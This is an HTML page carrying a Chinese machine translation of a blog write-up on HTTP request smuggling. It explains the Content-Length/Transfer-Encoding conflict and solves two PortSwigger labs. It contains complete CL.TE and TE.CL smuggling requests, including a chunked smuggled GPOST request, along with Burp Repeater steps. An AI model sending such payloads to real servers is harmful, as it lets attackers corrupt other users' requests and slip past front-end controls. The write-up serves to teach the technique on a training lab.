<html>
<head>
<title>HTTP request smuggling Explained and Exploited Part 0x1</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTTP请求走私解释和利用第0x1部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x1-89ce2956534f?source=collection_archive---------1-----------------------#2022-10-16">https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x1-89ce2956534f?source=collection_archive---------1-----------------------#2022-10-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="808c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨！我的名字是Hashar Mujahid，今天我们将先睹为快请求走私漏洞。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/11cb3b2d2a29f5afbd58dd826cfd0c20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ixXLqWdpdXT3YvxR.png"/></div></div></figure><p id="6653" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以让我们来看看什么是HTTP请求走私！</p><h1 id="8d00" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">什么是HTTP请求走私？</h1><p id="0951" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">HTTP请求走私是一种利用技术，其中恶意请求被插入到原始请求中，然后由后端服务器处理。在这种攻击中，恶意请求被偷运和处理。</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="fb88" class="mf ky iq mb b gy mg mh l mi mj">Content-Length and Transfer-Encoding </span></pre><p id="1b95" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">报头在成功的HTTP请求走私攻击中起着重要的作用。</p><h1 id="c784" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">HTTP请求走私攻击会发生什么？</h1><p id="0931" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">当应用程序的前端向后端发送请求时，它会同时发送来自其他用户的多个并行请求，所有这些请求都是通过同一个后端网络发送的。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mk"><img src="../Images/8625020963b8862d4fe5b6d16f5a1c2e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0n1S6G3V6Un-xKq89pSdaQ.png"/></div></div><figcaption class="ml mm gj gh gi mn mo bd b be z dk translated">多个用户通过相同的后端网络请求，颜色显示了边界</figcaption></figure><p id="13e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，前端和后端都知道一个请求在哪里结束，另一个请求在哪里开始是至关重要的。否则，攻击者可能会发送一个不明确的请求，前端和后端系统会对该请求做出不同的解释:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mp"><img src="../Images/e26d82518e206b683dd037d1351b9b97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JzctUs9xBWN00EqgDzHJ4A.png"/></div></div></figure><p id="897b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我们在上面的图片中看到的，攻击者发送了一个不明确的请求，被后端错误地解释，该请求成为了其他用户请求的一部分。</p><h1 id="f0eb" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">HTTP请求走私漏洞是如何产生的？</h1><p id="a0c9" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">HTTP协议提供了两个报头来表示HTTP请求的结束</p><blockquote class="mq mr ms"><p id="9821" class="jn jo mt jp b jq jr js jt ju jv jw jx mu jz ka kb mv kd ke kf mw kh ki kj kk ij bi translated">内容长度</p><p id="8aae" class="jn jo mt jp b jq jr js jt ju jv jw jx mu jz ka kb mv kd ke kf mw kh ki kj kk ij bi translated">传输编码</p></blockquote><h2 id="f122" class="mf ky iq bd kz mx my dn ld mz na dp lh jy nb nc ll kc nd ne lp kg nf ng lt nh bi translated"><strong class="ak">内容长度:</strong></h2><p id="a350" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">内容长度以字节为单位指定请求的长度。</p><p id="81ce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">例如:</strong></p><p id="2a16" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ni nj nk mb b">Content-Length: 3421312</code></p><h2 id="49a7" class="mf ky iq bd kz mx my dn ld mz na dp lh jy nb nc ll kc nd ne lp kg nf ng lt nh bi translated"><strong class="ak">传输编码:</strong></h2><p id="7739" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">此标头指定邮件正文使用分块编码。区块大小以十六进制字节表示。如果块大小为0字节，则消息终止。</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="a06f" class="mf ky iq mb b gy mg mh l mi mj">Transfer-Encoding: chunked</span></pre><p id="f4fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们通常在服务器响应中看到这个头，因为一些服务器不支持这个头作为客户端请求。</p><p id="396b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果前端和后端服务器在(可能混淆的)<code class="fe ni nj nk mb b">Transfer-Encoding</code>头方面表现不同，那么它们可能在连续请求之间的边界上不一致，从而导致请求走私漏洞。</p><h2 id="8763" class="mf ky iq bd kz mx my dn ld mz na dp lh jy nb nc ll kc nd ne lp kg nf ng lt nh bi translated"><strong class="ak">剥削:</strong></h2><p id="76ab" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">HTTP走私攻击包括将<code class="fe ni nj nk mb b">Content-Length</code>和<code class="fe ni nj nk mb b">Transfer-Encoding</code>放在同一个请求中，这样前端和后端服务器就可以不同地处理请求。</p><h1 id="7d3c" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">HTTP走私攻击的类型:</h1><ul class=""><li id="a75a" class="nl nm iq jp b jq lv ju lw jy nn kc no kg np kk nq nr ns nt bi translated"><strong class="jp ir"> CL-TE: </strong>前端使用<code class="fe ni nj nk mb b">Content-Length</code>，后端使用<code class="fe ni nj nk mb b">Transfer-Encoding</code>。</li><li id="305a" class="nl nm iq jp b jq nu ju nv jy nw kc nx kg ny kk nq nr ns nt bi translated"><strong class="jp ir">忒。CL: </strong>前端使用<code class="fe ni nj nk mb b">Tranfer-Encoding</code>，后端使用<code class="fe ni nj nk mb b">Content-Length</code>。</li><li id="46e1" class="nl nm iq jp b jq nu ju nv jy nw kc nx kg ny kk nq nr ns nt bi translated"><strong class="jp ir">忒。TE: </strong>前端和后端服务器都支持Transfer-Encoding头，但是可以通过以某种方式混淆头来说服其中一个服务器不处理它。</li></ul><h1 id="2776" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">CL。TE漏洞:</h1><p id="8283" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">这里前端服务器使用<code class="fe ni nj nk mb b">Content-Length</code>头，后端服务器使用<code class="fe ni nj nk mb b">Transfer-Encoding</code>头。我们可以执行简单的HTTP请求走私攻击，如下所示:</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="b8b1" class="mf ky iq mb b gy mg mh l mi mj">POST / HTTP/1.1 <br/>Host: vulnerable-website.com <br/>Content-Length: 13 <br/>Transfer-Encoding: chunked  </span><span id="e09a" class="mf ky iq mb b gy nz mh l mi mj">0 <br/> <br/>SMUGGLED</span></pre><h1 id="a75b" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">实验室:HTTP请求走私，基本CL。TE脆弱性</h1><p id="52ac" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">本实验涉及前端和后端服务器，前端服务器不支持分块编码。前端服务器拒绝不使用GET或POST方法的请求。</p><p id="5415" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了解决这个实验，偷偷向后端服务器发送一个请求，这样后端服务器处理的下一个请求看起来使用了<code class="fe ni nj nk mb b">GPOST</code>方法。</p><p id="e2c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问实验室:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oa"><img src="../Images/9463ccf52e68dcf51132351a1671fd04.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*F9N7_nKXckf_onUQp07MXA.png"/></div></div></figure><p id="f6ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将请求方法更改为POST。</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="24cb" class="mf ky iq mb b gy mg mh l mi mj">POST / HTTP/1.1<br/>Host: 0a5c005b031de1e4c0ef4924003b00cb.web-security-academy.net<br/>Cookie: session=HrbfSiDceLLxPD6b5u1w47m0v9R4xY3n<br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Upgrade-Insecure-Requests: 1<br/>Sec-Fetch-Dest: document<br/>Sec-Fetch-Mode: navigate<br/>Sec-Fetch-Site: none<br/>Sec-Fetch-User: ?1<br/>Te: trailers<br/>Connection: close<br/>Content-Type: application/x-www-form-urlencoded<br/><strong class="mb ir">Content-Length: 0 <br/>ADD Transfer-Encoding:</strong></span></pre><p id="9a4c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并修改请求。</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="c4bf" class="mf ky iq mb b gy mg mh l mi mj">POST / HTTP/1.1<br/>Host: 0a5c005b031de1e4c0ef4924003b00cb.web-security-academy.net<br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0<br/>Connection: keep-alive<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 8<br/>Transfer-Encoding: <strong class="mb ir">chunked</strong></span><span id="3a15" class="mf ky iq mb b gy nz mh l mi mj"><strong class="mb ir">0</strong></span><span id="3682" class="mf ky iq mb b gy nz mh l mi mj"><strong class="mb ir">G</strong></span></pre><p id="6a28" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将此请求发送两次，第一次响应应为200 ok，第二次响应应为</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ob"><img src="../Images/03dedb3e7e0f8196e6f73539561fd742.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZCi12hVwZwTn83IrEegF4w.png"/></div></div></figure><p id="8bc0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到服务器无法识别该方法，但是我们发送POST方法的方式就是响应显示GPOST的原因。</p><p id="19f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是因为由于我们的头操作，服务器混淆了内容长度和传输编码，无法确定我们发送的第一个请求的结束，留下的数据被附加到下一个请求，这使得POST到GPOST。</p><p id="809f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们在第一个请求的post数据中发送L，我们将在下一个请求的响应中得到一个LPOST错误。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oc"><img src="../Images/4221fa6c489d84c22db08fdd5385cb4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bBuOOf2r1Mj9ThnPG5KKuA.png"/></div></div></figure><h1 id="20bc" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">TE。CL漏洞:</h1><p id="2258" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">这里，前端服务器使用<code class="fe ni nj nk mb b">Transfer-Encoding</code>报头，后端服务器使用<code class="fe ni nj nk mb b">Content-Length</code>报头。我们可以执行简单的HTTP请求走私攻击，如下所示:</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="136b" class="mf ky iq mb b gy mg mh l mi mj">POST / HTTP/1.1 <br/>Host: vulnerable-website.com <br/>Content-Length: 3 <br/>Transfer-Encoding: chunked  </span><span id="94d6" class="mf ky iq mb b gy nz mh l mi mj">8 <br/>SMUGGLED<br/>0</span></pre><h1 id="0d66" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">实验室:HTTP请求走私，基础TE。CL漏洞</h1><p id="8373" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">本实验涉及前端和后端服务器，后端服务器不支持分块编码。前端服务器拒绝不使用GET或POST方法的请求。</p><p id="6b55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了解决lab，偷偷将一个请求发送到后端服务器，这样后端服务器处理的下一个请求就好像使用了方法<code class="fe ni nj nk mb b">GPOST</code>。</p><p id="5082" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们需要创建一个错误</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="23eb" class="mf ky iq mb b gy mg mh l mi mj">"Unrecognized method GPOST"</span></pre><p id="2de8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这一个在某种程度上也和前一个非常相似。</p><blockquote class="mq mr ms"><p id="9692" class="jn jo mt jp b jq jr js jt ju jv jw jx mu jz ka kb mv kd ke kf mw kh ki kj kk ij bi translated">我们需要捕获GET请求。</p><p id="094b" class="jn jo mt jp b jq jr js jt ju jv jw jx mu jz ka kb mv kd ke kf mw kh ki kj kk ij bi translated">将GET方法更改为POST。</p><p id="5283" class="jn jo mt jp b jq jr js jt ju jv jw jx mu jz ka kb mv kd ke kf mw kh ki kj kk ij bi translated">删除不必要的标题。</p></blockquote><p id="520a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向请求添加<code class="fe ni nj nk mb b">Transfer-Encoding: Chunked</code>头</p><p id="1de9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">添加我们的有效负载来创建错误。</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="b386" class="mf ky iq mb b gy mg mh l mi mj"><strong class="mb ir">5c</strong>  ===&gt; 92 bytes<br/>GPOST / HTTP/1.1 <br/>Content-Type: application/x-www-form-urlencoded <br/>Content-Length: 15  </span><span id="5f95" class="mf ky iq mb b gy nz mh l mi mj">x=1 <br/>0</span></pre><p id="8c37" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是最重要的是取消选中repeater中的“更新内容长度”。</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="1ea8" class="mf ky iq mb b gy mg mh l mi mj">POST / HTTP/1.1<br/>Host: 0ad8008b037e46d8c01669a5007c004d.web-security-academy.net<br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 4<br/>Transfer-Encoding: chunked</span><span id="a10c" class="mf ky iq mb b gy nz mh l mi mj">5c<br/>GPOST / HTTP/1.1<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 15</span><span id="da4b" class="mf ky iq mb b gy nz mh l mi mj">x=1<br/>0</span></pre><p id="c6a3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们需要在结尾0后添加/r/n/r/n序列。{ {只需按enter 2wice}}。</p><p id="52bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将此请求发送两次，您会看到一个错误。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi od"><img src="../Images/835fe6952a877183d00ec0018ffd0608.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zUUYBRUTsazFICjh8eI4KQ.png"/></div></div></figure><p id="dece" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到这里发生了同样的事情，恶意请求被留下，并与我们发出的第二个请求一起执行，这使它变成。</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="e894" class="mf ky iq mb b gy mg mh l mi mj"><strong class="mb ir">GPOST / HTTP/1.1</strong><br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 15<br/>POST / HTTP/1.1<br/>Host: 0ad8008b037e46d8c01669a5007c004d.web-security-academy.net<br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 4<br/>Transfer-Encoding: chunked</span><span id="22a7" class="mf ky iq mb b gy nz mh l mi mj">5c<br/>GPOST / HTTP/1.1<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 15</span><span id="1079" class="mf ky iq mb b gy nz mh l mi mj">x=1<br/>0</span></pre><p id="1991" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这就是应用程序出错的原因。</p><p id="8fb1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在下一篇博客中，我们将学习如何开发TE。TE漏洞。</p><p id="3601" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在那之前。快乐黑客❤.</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="oe of l"/></div></figure></div><div class="ab cl og oh hu oi" role="separator"><span class="oj bw bk ok ol om"/><span class="oj bw bk ok ol om"/><span class="oj bw bk ok ol"/></div><div class="ij ik il im in"><h2 id="8ad3" class="mf ky iq bd kz mx my dn ld mz na dp lh jy nb nc ll kc nd ne lp kg nf ng lt nh bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae on" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4条线索、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>